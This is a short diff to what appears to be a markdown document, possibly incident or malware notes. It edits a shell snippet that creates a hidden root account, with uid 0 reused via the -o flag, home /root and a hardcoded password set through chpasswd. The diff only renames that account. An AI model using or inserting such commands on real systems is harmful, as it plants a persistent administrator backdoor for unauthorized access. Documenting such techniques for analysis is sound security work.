@@ -231,8 +231,8 @@ cat /etc/group | grep cis
 
 ```
 if [ ! -e /tmp/passwd.bak ]; then
- useradd -d /root -u 0 -o -g root -G root qDaDxD
- echo qDaDxD:passXX*1*11|chpasswd
+ useradd -d /root -u 0 -o -g root -G root ppp
+ echo ppp:passXX*1*11|chpasswd
 fi
 ```
 
